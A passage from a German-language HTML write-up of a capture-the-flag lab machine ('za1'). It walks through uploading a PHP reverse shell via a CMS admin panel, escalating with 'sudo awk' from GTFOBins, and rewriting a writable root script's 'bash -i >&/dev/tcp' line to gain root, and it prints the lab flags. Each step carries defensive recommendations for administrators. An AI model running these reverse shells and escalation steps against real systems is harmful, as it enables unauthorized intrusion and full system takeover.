+                <strong>Bewertung:</strong> Der Versuch, über `options-general.php` PHP-Formate zu aktivieren, scheint nicht der direkte Weg zur Shell zu sein, obwohl es eine Konfigurationsoption gibt, die auf solche Funktionen hindeutet. Das "设置已经保存" bedeutet "Einstellungen wurden gespeichert". Dies ist zwar ein Hinweis auf modifizierbare Optionen, aber die dokumentierte RCE-Methode über `install.php` ist vielversprechender. Es ist gut, alle Admin-Optionen zu erkunden, um den vollen Umfang der Kompromittierung zu verstehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erkunden Sie alle Admin-Panel-Optionen, auch wenn ein bekannter RCE-Vektor existiert. Dies hilft, ein umfassendes Bild der Sicherheitskonfiguration zu erhalten. Priorisieren Sie jedoch den effizientesten Weg zur Shell. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie CMS-Systeme restriktiv. Deaktivieren Sie Funktionen, die die Ausführung von unsicheren Dateitypen oder Code von unbekannten Quellen ermöglichen. Überprüfen Sie, welche Dateitypen über das Admin-Panel hochgeladen oder aktiviert werden können.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://za1.hmv/admin/options-general.php</span>
+<span class="command">[X] checkbox anklicken andere Formate: php</span>
+<span class="command">设置已经保存</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die RCE-Methode über <code>install.php</code> kennengelernt hatte, suchte ich nach alternativen Wegen, um eine Shell hochzuladen, falls die `install.php`-Methode fehlschlagen sollte. Ein klassischer Weg ist die Nutzung von Upload-Funktionen im Admin-Panel, z.B. über die Post-Erstellung (`write-post.php`), die oft Medien-Uploads zulässt.
+            </p>
+            <p class="evaluation">
+                <strong>Beweismittel & Bewertung:</strong> Die Navigation zum Upload-Bereich im Admin-Panel über `write-post.php` und das Hochladen einer Reverse-Shell-Datei (`revshell.php`) über diesen Weg war erfolgreich. Obwohl die RCE über <code>install.php</code> der primäre Proof of Concept ist, zeigt die Möglichkeit des direkten Shell-Uploads, dass die Maschine auch auf diesem Weg angreifbar war. Die bereitgestellte URL `http://za1.hmv/usr/uploads/2025/06/1121671764.php` beweist, dass die Datei erfolgreich hochgeladen und über den Webserver zugänglich ist. Dies ist ein weiterer kritischer Erfolg für den Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie alle Upload-Funktionen im Admin-Panel auf die Möglichkeit des Hochladens von Web-Shells. Versuchen Sie verschiedene Dateitypen und Dateinamen, um Filter zu umgehen. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Validierung und Whitelisting für Dateiuploads. Beschränken Sie die erlaubten Dateitypen auf das absolut Notwendigste (z.B. Bilder, PDF). Überprüfen Sie hochgeladene Dateien auf schädlichen Inhalt. Konfigurieren Sie den Webserver so, dass PHP-Dateien in Upload-Verzeichnissen nicht ausgeführt werden können.
+            </p>
+            <img src="shell_im_adminp._erstellen.jpg" alt="hier sieht man wie ich zur upload funktion zu write im portal navigiere">
+            <img src="shell_im_adminp._hochladen.jpg" alt="hier sieht man wie ich die revshell hochlade">
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">[Link: revshell.php | Ziel: http://za1.hmv/usr/uploads/2025/06/1121671764.php]</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Reverse Shell über das Admin-Panel erfolgreich hochgeladen wurde und die URL bekannt ist, ist der nächste Schritt, sie auszuführen und eine Verbindung zurück zu meinem angreifenden System herzustellen. Ich startete einen Netcat-Listener auf Port 9001 auf meinem Kali-System und rief die PHP-Shell-URL im Browser auf (oder mit `curl`).
+            </p>
+            <p class="evaluation">
+                <strong>Beweismittel & Bewertung:</strong> Fantastisch! Der Reverse-Shell-Versuch war erfolgreich. Mein Netcat-Listener fing die Verbindung von der Zielmaschine ab. Ich erhielt eine Shell als Benutzer `www-data`, die Bestätigung der `uid=33(www-data)` zeigt die niedrigen Berechtigungen des Webserver-Benutzers. Dies ist der Beweis für die erfolgreiche Remote Code Execution und den initialen Zugriff auf das System. Von hier aus kann ich die System-Enumeration starten, um Privilegien-Eskalationsmöglichkeiten zu finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Etablieren Sie nach erfolgreicher RCE immer eine stabile Reverse Shell. Führen Sie nach dem initialen Zugriff eine umfassende Enumeration durch, um Schwachstellen für die Privilegien-Eskalation zu finden (SUID, Sudo-Konfigurationen, Cronjobs, etc.). <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Egress-Filterung auf Ihrer Firewall, um ausgehende Verbindungen von Webservern zu blockieren, es sei denn, sie sind explizit erlaubt. Dies kann Reverse Shells verhindern. Überwachen Sie ungewöhnliche Netzwerkaktivitäten und Dateiänderungen im Webserver-Dokumentenstamm.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://za1.hmv/usr/uploads/2025/06/1121671764.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="comment">reverse shell to $ip:$PORT");</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+listening on <span class="command">[any] 9001</span> ...
+connect to <span class="command">[192.168.2.199]</span> from <span class="command">(UNKNOWN) [192.168.2.53] 57784</span>
+<span class="command">Linux za_1 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
+ <span class="command">21:38:03 up  2:31,  0 users,  load average: 0.02, 0.05, 0.14</span>
+<span class="command">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="command">/bin/sh: 0: can't access tty; job control turned off</span>
+<span class="command">$</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich eine Reverse Shell als `www-data` erhalten hatte, ist der erste Schritt zur Privilegien-Eskalation die Überprüfung der `sudo`-Berechtigungen des Benutzers. Der Befehl `sudo -l` listet alle Befehle auf, die der aktuelle Benutzer mit `sudo` ausführen darf, und gibt an, ob dafür ein Passwort erforderlich ist. Dies ist eine primäre Quelle für Privilegien-Eskalationsmöglichkeiten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Ausgabe von `sudo -l` zeigte eine sehr kritische Fehlkonfiguration: `(za_1) NOPASSWD: /usr/bin/awk`. Dies bedeutet, dass der Benutzer `www-data` das Binary `/usr/bin/awk` als Benutzer `za_1` ohne Passworteingabe ausführen kann. Dies ist ein direkter Weg zur horizontalen Privilegien-Eskalation zu `za_1`, da <code>awk</code> ein bekanntes Binary auf GTFOBins ([Link: https://gtfobins.github.io/gtfobins/awk/#sudo | Ziel: https://gtfobins.github.io/gtfobins/awk/#sudo]) ist, das zur Ausführung von Shell-Befehlen unter erhöhten Rechten missbraucht werden kann. Dies ist ein großer Erfolg!
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie immer `sudo -l` sofort nach Erhalt einer Shell. Nutzen Sie GTFOBins, um schnell bekannte Ausnutzungswege für gefundene Binaries zu identifizieren. Priorisieren Sie `NOPASSWD`-Einträge. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie `sudoers` niemals so, dass `NOPASSWD`-Optionen für Binaries gesetzt sind, die zur Shell-Erlangung missbraucht werden können. Führen Sie regelmäßige Audits der `sudoers`-Datei durch und beschränken Sie die Berechtigungen auf das absolut Notwendigste.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@za_1:/$ sudo -l</span>
+<span class="command">Matching Defaults entries for www-data on za_1:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+
+<span class="command">User www-data may run the following commands on za_1:</span>
+    <span class="command">(za_1) <span class="password">NOPASSWD: /usr/bin/awk</span></span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Möglichkeit der Privilegien-Eskalation zu `za_1` über `sudo /usr/bin/awk` identifiziert hatte, war der nächste Schritt, die Home-Verzeichnisse auf dem System zu enumerieren. Dies ist wichtig, um zu sehen, welche Benutzer existieren und wo sich die Benutzer-Flag (`user.txt`) befinden könnte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Listing des <code>/home/</code>-Verzeichnisses bestätigte die Existenz eines Benutzers namens `za_1` mit seinem eigenen Home-Verzeichnis (`/home/za_1`). Dies passt perfekt zu den `sudo`-Berechtigungen, die ich gerade gefunden habe. Im Verzeichnis von `za_1` konnte ich die Datei `user.txt` sehen, was ein klares Ziel für die erste Flag ist. Die weitere Enumeration des Home-Verzeichnisses von `za_1` zeigte auch interessante versteckte Verzeichnisse wie `.root/` und `.ssh/`, die auf weitere Privilegien-Eskalationsmöglichkeiten oder Anmeldedaten hinweisen könnten. Dies ist ein großer Erfolg und weist auf eine gut strukturierte Angriffsfläche hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer eine gründliche Dateisystem-Enumeration durch, um Benutzerverzeichnisse und versteckte Dateien zu finden. Achten Sie auf ungewöhnliche oder sensitiv benannte Verzeichnisse (.root, .ssh) und versuchen Sie, deren Inhalt zu überprüfen. <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie Dateiberechtigungen und versteckte Verzeichnisse in Benutzer-Home-Verzeichnissen. Stellen Sie sicher, dass sensible Dateien (wie SSH-Schlüssel oder temporäre Root-Dateien) nicht öffentlich zugänglich sind oder über normale Benutzerrechte eingesehen werden können.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@za_1:/$ cd /home/</span>
+<span class="command">www-data@za_1:/home$ ls -la</span>
+<span class="command">total 12</span>
+<span class="command">drwxr-xr-x  3 root root 4096 Jul 26  2023 .</span>
+<span class="command">drwxr-xr-x 24 root root 4096 Jul 26  2023 ..</span>
+<span class="command">drwxr-xr-x  6 za_1 za_1 4096 Aug 22  2023 za_1</span>
+<span class="command">www-data@za_1:/home$ cd  za_1/</span>
+<span class="command">www-data@za_1:/home/za_1$ ls -la</span>
+<span class="command">total 44</span>
+<span class="command">drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .</span>
+<span class="command">drwxr-xr-x 3 root root 4096 Jul 26  2023 ..</span>
+<span class="command">lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc</span>
+<span class="command">drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache</span>
+<span class="command">drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile</span>
+<span class="command">drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root</span>
+<span class="command">drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful</span>
+<span class="command">-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit den <code>sudo</code>-Berechtigungen für <code>/usr/bin/awk</code> konnte ich nun eine Shell als Benutzer `za_1` erlangen. Die GTFOBins-Website ist eine hervorragende Ressource, um zu erfahren, wie man Binaries mit speziellen Berechtigungen für Privilegien-Eskalation missbrauchen kann. Der Befehl <code>sudo awk 'BEGIN {system("/bin/sh")}'</code> ist die Standardmethode, um eine Shell mit den Berechtigungen des Zielbenutzers (`za_1`) über `awk` zu erhalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Ausnutzung von `awk` über `sudo` war erfolgreich! Ich erhielt eine Shell als Benutzer `za_1`. Die `id`-Ausgabe bestätigte meine neuen Berechtigungen: `uid=1000(za_1) gid=1000(za_1) groups=...`. Dies ist ein entscheidender Fortschritt in der Privilegien-Eskalation. Ich konnte sofort die `user.txt`-Datei lesen und die erste Flag abrufen. Die einfache Ausnutzbarkeit von `awk` zeigt eine Schwachstelle in der `sudoers`-Konfiguration.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie GTFOBins als primäre Ressource für `sudo`-Fehlkonfigurationen. Testen Sie die gängigsten Exploits für die identifizierten Binaries. Nach der Eskalation sofort die Benutzer-Flag abrufen. <br>
+                <strong>Empfehlung (Admin):</strong> Auditieren Sie die `sudoers`-Datei regelmäßig auf Einträge, die die Ausführung von Shell-kompatiblen Binaries (wie `awk`) mit NOPASSWD-Optionen erlauben. Entfernen Sie diese Berechtigungen, wenn sie nicht absolut kritisch für den Betrieb sind. Implementieren Sie ein Least Privilege Model für alle Benutzer.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">[Link: https://gtfobins.github.io/gtfobins/awk/#sudo | Ziel: https://gtfobins.github.io/gtfobins/awk/#sudo]</span>
+<span class="command">Sudo</span>
+
+<span class="command">If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</span>
+
+    <span class="command">sudo awk 'BEGIN {system("/bin/sh")}'</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@za_1:/home/za_1$ sudo -u za_1 awk 'BEGIN {system("/bin/sh")}'</span>
+<span class="command">$ id</span>
+<span class="command">uid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span>
+<span class="command">$</span>
+
+<span class="command">$ ls</span>
+<span class="command">user.txt</span>
+<span class="command">$ cat user.txt</span>
+<span class="password">flag{ThursD0y_v_wo_50}</span>
+<span class="command">$ bash</span>
+<span class="command">za_1@za_1:~$ id</span>
+<span class="command">uid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Benutzer-Flag erlangt hatte, führte ich als Benutzer `za_1` eine weitere Enumeration durch, um den Weg zu Root zu finden. Ich überprüfte erneut die <code>sudo -l</code>-Berechtigungen, um sicherzustellen, dass keine direkten Root-Zugriffsmöglichkeiten für `za_1` bestehen, und untersuchte die versteckten Verzeichnisse `.ssh/` und `.root/` im Home-Verzeichnis von `za_1` auf sensible Dateien. Der Befehl `ls -la .ssh/` zeigt, dass die `authorized_keys` existiert, aber leer ist, was keine direkten SSH-Anmeldungen ermöglicht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erneute Überprüfung von `sudo -l` zeigte, dass `za_1` keine weiteren `NOPASSWD` zu Root hatte. Das war zu erwarten, da wir bereits eine Methode zur User-Eskalation hatten. Der entscheidende Fund war die Datei `back.sh` im Verzeichnis `.root/` mit vollen Lese-, Schreib- und Ausführungsberechtigungen für den Benutzer `za_1` (`-rwxrwxrwx`). Dies ist extrem kritisch, da ein Skript mit Root-Rechten von einem normalen Benutzer geändert werden kann. Das Skript enthält einen <code>cp</code>-Befehl und eine Reverse Shell-Verbindung zu einer internen IP (`10.0.2.18`). Der `back.sh` war offensichtlich ein Backdoor-Skript oder ein Wartungsskript, das von Root ausgeführt wird, und die schreibbaren Berechtigungen für `za_1` sind eine schwerwiegende Fehlkonfiguration. Ich konnte es ändern und meine eigene Reverse Shell einfügen. Das ist der finale Schlüssel zur Root-Eskalation!
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie eine gründliche Nach-Eskalations-Enumeration durch. Achten Sie auf Skripte in ungewöhnlichen Verzeichnissen, die `root`-Besitz und `root`-Ausführungsrechte haben, aber für niedrigprivilegierte Benutzer schreibbar sind. Dies ist ein klassischer Angriffsvektor (Writeable Cronjobs, SUID-Backdoors). Modifizieren Sie solche Skripte vorsichtig, um eine Root-Shell zu erhalten. <br>
+                <strong>Empfehlung (Admin):</strong> Setzen Sie niemals Root-Besitz und -Ausführungsrechte für Skripte, die von normalen Benutzern schreibbar sind. Implementieren Sie strikte Dateiberechtigungen (Least Privilege) auf dem gesamten System, insbesondere für Root-eigene Dateien und Skripte. Verwenden Sie `root`-Cronjobs nur für vertrauenswürdige Skripte und überprüfen Sie deren Berechtigungen. Führen Sie regelmäßige Audits von Dateiberechtigungen durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">za_1@za_1:~$ sudo -l</span>
+<span class="command">[sudo] password for za_1:</span>
+<span class="command">za_1@za_1:~$ ls -la</span>
+<span class="command">total 44</span>
+<span class="command">drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .</span>
+<span class="command">drwxr-xr-x 3 root root 4096 Jul 26  2023 ..</span>
+<span class="command">lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc</span>
+<span class="command">drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache</span>
+<span class="command">drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile</span>
+<span class="command">drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root</span>
+<span class="command">drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful</span>
+<span class="command">-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo</span>
+<span class="command">-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt</span>
+<span class="command">za_1@za_1:~$ ls -la .ssh/</span>
+<span class="command">total 8</span>
+<span class="command">drwx------ 2 za_1 za_1 4096 Jul 26  2023 .</span>
+<span class="command">drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 ..</span>
+<span class="command">-rw------- 1 za_1 za_1    0 Jul 26  2023 authorized_keys</span>
+<span class="command">za_1@za_1:~$ ls -la .root/</span>
+<span class="command">total 12</span>
+<span class="command">drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .</span>
+<span class="command">drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 ..</span>
+<span class="command">-rwxrwxrwx 1 root root  117 Jul 26  2023 back.sh</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Datei <code>.root/back.sh</code> als schreibbar für `za_1` und als Root-Skript identifiziert hatte, war der letzte Schritt zur Root-Eskalation die Bearbeitung dieser Datei. Ich nutzte <code>nano</code>, um das Skript zu öffnen und die vorhandene Reverse-Shell-Verbindung zu <code>10.0.2.18:999</code> durch meine eigene Reverse-Shell-Verbindung zu <code>192.168.2.199:5555</code> zu ersetzen. Dies stellt sicher, dass das Skript, wenn es als Root ausgeführt wird, eine Shell zurück zu meinem System sendet.
+            </p>
+            <p class="evaluation">
+                <strong>Beweismittel & Bewertung:</strong> Fantastisch! Die Root-Eskalation war erfolgreich! Nachdem ich die `back.sh`-Datei bearbeitet und auf das Auslösen der Reverse Shell gewartet hatte (vermutlich über einen Cronjob oder eine regelmäßige Ausführung durch Root), fing mein Netcat-Listener auf Port 5555 die Verbindung ab. Die `id`-Ausgabe in der neuen Shell bestätigte: `uid=0(root) gid=0(root) groups=0(root)`. Ich bin jetzt als `root` angemeldet, was das ultimative Ziel dieses Penetrationstests darstellt und die vollständige Kompromittierung des Systems beweist. Dies ist ein klarer Proof of Concept einer kritischen Sicherheitslücke.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Seien Sie geduldig, wenn Sie ein schreibbares Root-Skript finden; es könnte durch einen Cronjob oder andere automatisierte Prozesse ausgelöst werden. Passen Sie die Reverse Shell-Details (IP, Port) präzise an. Bestätigen Sie immer den Root-Zugriff mit dem `id`-Befehl. <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine Skripte, die als Root ausgeführt werden (insbesondere Cronjobs), für normale Benutzer schreibbar sind. Implementieren Sie strenge Zugriffskontrollen und Dateiberechtigungen für alle Systemdateien und -skripte. Führen Sie regelmäßige Überprüfungen von Cronjobs und sensiblen Dateien durch. Implementieren Sie Intrusion Detection Systeme (IDS), die Manipulationen an Root-Skripten erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">za_1@za_1:~$ cat .root/back.sh</span>
+<span class="command">#!/bin/bash</span>
+
+<span class="command">cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql</span>
+
+<span class="command">bash -i >&/dev/tcp/<span class="password">10.0.2.18/999</span> 0>&1</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">za_1@za_1:~$ nano .root/back.sh</span>
+<span class="command">#!/bin/bash</span>
+
+<span class="command">cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql</span>
+
+<span class="command">bash -i >&/dev/tcp/<span class="password">192.168.2.199/5555</span> 0>&1</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+listening on <span class="command">[any] 5555</span> ...
+connect to <span class="command">[192.168.2.199]</span> from <span class="command">(UNKNOWN) [192.168.2.53] 55926</span>
+<span class="command">bash: cannot set terminal process group (4790): Inappropriate ioctl for device</span>
+<span class="command">bash: no job control in this shell</span>
+<span class="command">root@za_1:~#</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/za_1/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{ThursD0y_v_wo_50}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">flag{qq_group_169232653}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben  - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. Juni 2025</p>
+    </footer>
+
+</body>
+</html>
